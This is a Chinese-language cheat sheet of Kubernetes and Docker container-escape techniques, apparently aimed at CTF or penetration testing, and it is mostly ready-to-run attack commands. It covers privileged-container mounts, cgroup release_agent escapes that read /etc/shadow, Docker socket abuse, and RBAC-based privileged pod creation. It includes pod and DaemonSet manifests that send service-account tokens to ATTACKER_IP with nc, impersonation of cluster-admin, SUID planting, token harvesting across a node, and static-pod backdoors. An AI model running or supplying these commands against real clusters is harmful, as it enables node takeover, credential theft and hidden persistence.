# K8s 容器逃逸技术详解

## 1. 特权容器逃逸

特权容器（`privileged: true`）拥有宿主机所有 Linux capabilities，可直接操作宿主机设备。

### 1.1 磁盘挂载逃逸
```bash
# 查看宿主机磁盘设备
fdisk -l 2>/dev/null || lsblk
# 常见设备：/dev/sda1, /dev/vda1, /dev/xvda1

mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot

# 读取 flag / 写入 SSH 密钥
cat /tmp/hostroot/root/flag.txt
echo "YOUR_SSH_KEY" >> /tmp/hostroot/root/.ssh/authorized_keys

# 完整 chroot
chroot /tmp/hostroot bash
```

### 1.2 cgroup release_agent 逃逸
```bash
# 在特权容器中，利用 cgroup 的 release_agent 机制在宿主机执行命令
d=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > $d/w/cgroup.procs"
sleep 1
cat /output
```

### 1.3 nsenter 逃逸（需要 hostPID + SYS_ADMIN/SYS_PTRACE）
```bash
# 只有在容器可见宿主机 PID namespace（如 hostPID: true）时，target 1 才通常指向宿主机 init
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

## 2. Docker Socket 逃逸

```bash
# 检查 docker.sock 是否挂载
ls -la /var/run/docker.sock

# 用 curl 操作 Docker API
# 列出容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# 创建特权容器并挂载宿主机根目录
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /hostroot/root/flag.txt"],
    "HostConfig": {
      "Binds": ["/:/hostroot"],
      "Privileged": true
    }
  }'

# 启动并查看输出
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/start
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/CONTAINER_ID/logs?stdout=true
```

如果有 docker CLI:
```bash
docker run -v /:/hostroot --privileged -it alpine chroot /hostroot bash
```

## 3. 挂载型逃逸（hostPath）

```bash
# 检查挂载点
mount | grep -v 'proc\|sys\|cgroup\|overlay'
df -h
cat /proc/mounts

# 常见危险挂载
# /var/log → 读取宿主机日志，可能含敏感信息
# /etc → 读取 shadow/passwd，写入 crontab
# / → 完全访问宿主机
```

如果挂载了 `/var/log`:
```bash
# 通过 symlink 技巧读取宿主机文件
ln -s /etc/shadow /var/log/shadow-link
# 等待日志轮转或触发日志读取
```

## 4. Procfs 逃逸（/proc/sysrq-trigger）

```bash
# 需要挂载了宿主机的 /proc
# 检查 core_pattern
cat /proc/sys/kernel/core_pattern
# 如果可写:
echo "|/path/to/payload" > /proc/sys/kernel/core_pattern
# 触发 core dump → 宿主机执行 payload
```

## 5. 内核漏洞逃逸

容器与宿主机共享内核，内核漏洞可直接逃逸：

| 漏洞 | 内核版本 | CVE |
|------|---------|-----|
| DirtyPipe | 5.8 - 5.16.11 | CVE-2022-0847 |
| DirtyCow | 2.6.22 - 4.8.3 | CVE-2016-5195 |
| OverlayFS | 5.11 - 5.15 | CVE-2021-3493 |
| runc | runc < 1.0-rc6 | CVE-2019-5736 |
| containerd | < 1.3.9 | CVE-2020-15257 |

### CVE-2019-5736（runc 逃逸，经典）
```bash
# 覆盖宿主机的 runc 二进制
# 需要在容器内执行，下次 docker exec 进入时触发
# 工具：https://github.com/Frichetten/CVE-2019-5736-PoC
```

## 6. Service Account Token 利用

即使无法逃逸容器，SA Token 可能有集群级别权限：
```bash
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 检查能否列出 secrets（高价值）
curl -sk -H "Authorization: Bearer $SA_TOKEN" $APISERVER/api/v1/secrets

# 检查能否创建 Pod（→ 创建特权 Pod 逃逸）
curl -sk -H "Authorization: Bearer $SA_TOKEN" $APISERVER/api/v1/namespaces/default/pods \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"pwned"},"spec":{"containers":[{"name":"pwned","image":"alpine","command":["sleep","infinity"],"securityContext":{"privileged":true}}],"hostNetwork":true,"hostPID":true}}'
```

## 7. 环境变量信息泄露

K8s 将 Service 信息注入环境变量：
```bash
env | sort
# 可发现其他服务的 IP 和端口
# MYSQL_SERVICE_HOST=10.96.x.x
# REDIS_SERVICE_HOST=10.96.x.x
```

## 8. RBAC 权限驱动的 Pod 逃逸

当 SA Token 拥有特定 RBAC 权限时，无需容器本身是特权模式，也可以通过创建/修改工作负载来实现逃逸。

### 8.1 create pods 权限 → 创建特权 Pod 窃取 Token

如果 SA 有 `create pods` 权限，可创建挂载了高权限 SA 的 Pod，窃取其 Token：
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: steal-token
  namespace: kube-system
spec:
  serviceAccountName: bootstrap-signer    # 目标高权限 SA
  automountServiceAccountToken: true
  hostNetwork: true
  containers:
  - name: steal
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "cat /run/secrets/kubernetes.io/serviceaccount/token | nc ATTACKER_IP 6666; sleep 99999"]
```

全特权 Pod 一键逃逸（单行命令）：
```bash
kubectl run r00t --restart=Never -ti --rm --image lol \
  --overrides '{"spec":{"hostPID":true,"containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

### 8.2 create/patch deployments、daemonsets、statefulsets、replicasets、jobs、cronjobs

这些控制器资源都可以间接创建 Pod，效果等同于 `create pods`：
```yaml
# 示例：通过 DaemonSet 在所有节点部署后门 Pod，窃取高权限 SA Token
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: backdoor
  template:
    metadata:
      labels:
        name: backdoor
    spec:
      serviceAccountName: bootstrap-signer
      automountServiceAccountToken: true
      hostNetwork: true
      containers:
      - name: backdoor
        image: alpine
        command: ["/bin/sh", "-c", "cat /run/secrets/kubernetes.io/serviceaccount/token | nc ATTACKER_IP 6666; sleep 99999"]
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
```

DaemonSet 的特殊优势：会在**集群所有节点**上运行，一次操作即可窃取所有节点上运行的 SA Token。

### 8.3 pods/exec 权限 → 进入现有高权限 Pod

```bash
# 列出所有 Pod 并找到 kube-system 中的高权限 Pod
kubectl get pods --all-namespaces
kubectl exec -it <POD_NAME> -n kube-system -- sh

# 进入后窃取 SA Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 8.4 update/patch pods/ephemeralcontainers → 临时容器注入

可以向已运行的 Pod 注入临时容器（ephemeral container），获得代码执行能力，甚至提权：
```bash
# 向目标 Pod 注入特权临时容器
kubectl debug -it <TARGET_POD> --image=alpine --target=<CONTAINER_NAME> -- sh

# 如果有 patch 权限，可以直接操作 API
kubectl patch pod <POD_NAME> --type=strategic --subresource=ephemeralcontainers -p '{
  "spec": {
    "ephemeralContainers": [{
      "name": "debugger",
      "image": "alpine",
      "command": ["sh"],
      "stdin": true,
      "tty": true,
      "securityContext": {"privileged": true}
    }]
  }
}'
```

注入到高权限 Pod 后可以窃取其 SA Token 或利用其已有的特权配置逃逸到节点。

### 8.5 impersonate 权限 → 模拟高权限账户

```bash
# 模拟 system:masters 组（cluster-admin）
kubectl get secrets --as=null --as-group=system:masters

# 模拟特定 SA
kubectl get pods --as=system:serviceaccount:kube-system:default

# REST API 方式
curl -k -H "Authorization: Bearer $SA_TOKEN" \
  -H "Impersonate-User: null" \
  -H "Impersonate-Group: system:masters" \
  https://API_SERVER:6443/api/v1/namespaces/kube-system/secrets/
```

## 9. 可写 hostPath SUID 提权（容器→宿主机 root）

当 Pod 挂载了可写的 hostPath 卷，且宿主机文件系统未使用 `nosuid` 选项时，可以在容器内植入 SUID 二进制文件：

```bash
# 容器内（以 root 运行）
# MOUNT 是容器内映射到宿主机目录的挂载点路径
MOUNT="/var/www/html/uploads"
cp /bin/bash "$MOUNT/suidbash"
chmod 6777 "$MOUNT/suidbash"

# 宿主机上执行（需要另一个向量触发，如 SSH、其他 RCE）
# 路径取决于 hostPath 配置
/opt/data/uploads/suidbash -p    # -p 保留 euid 0
```

检测可写 hostPath 挂载：
```bash
# 容器内
mount | column -t
cat /proc/self/mountinfo | grep host-path
# 测试可写性
TEST_DIR=/var/www/html
[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"
```

注意：如果宿主机挂载点有 `nosuid` 选项，SUID 位会被忽略。可通过 `cat /proc/mounts | grep <挂载点>` 检查。

## 10. 节点后渗透 — 逃逸后的关键信息

逃逸到节点后，以下路径包含高价值凭据：

```bash
# Kubelet 配置和凭据
/var/lib/kubelet/kubeconfig
/var/lib/kubelet/kubelet.conf
/var/lib/kubelet/config.yaml
/etc/kubernetes/kubelet.conf
/etc/kubernetes/admin.conf    # 如存在 → cluster-admin 权限
$HOME/.kube/config

# etcd 配置（控制平面节点）
/etc/kubernetes/manifests/etcd.yaml
/etc/kubernetes/pki/            # K8s PKI 证书和私钥

# 找到 kubelet 实际使用的 kubeconfig
ps -ef | grep kubelet | grep kubeconfig

# 窃取节点上所有 Pod 的 SA Token
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
    TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
    NS=$(cat $i)
    echo "[$NS] $TOKEN" | head -c 80
    echo "..."
done
```

### 10.1 Static Pod 持久化

如果已逃逸到节点，可以利用 Static Pod 在 kube-system 等命名空间中创建持久化后门：
```bash
# Static Pod 配置目录（默认）
ls /etc/kubernetes/manifests/

# 写入恶意 Static Pod（kubelet 自动创建并维护）
cat > /etc/kubernetes/manifests/backdoor.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: backdoor
    image: alpine
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# 更隐蔽的方式：修改 kubelet 的 staticPodURL 从远程拉取
# 修改 /var/lib/kubelet/config.yaml 中的 staticPodURL 字段
```

Static Pod 由 kubelet 直接管理，API Server 只能看到镜像 Pod（mirror pod），无法从 API 层面删除。
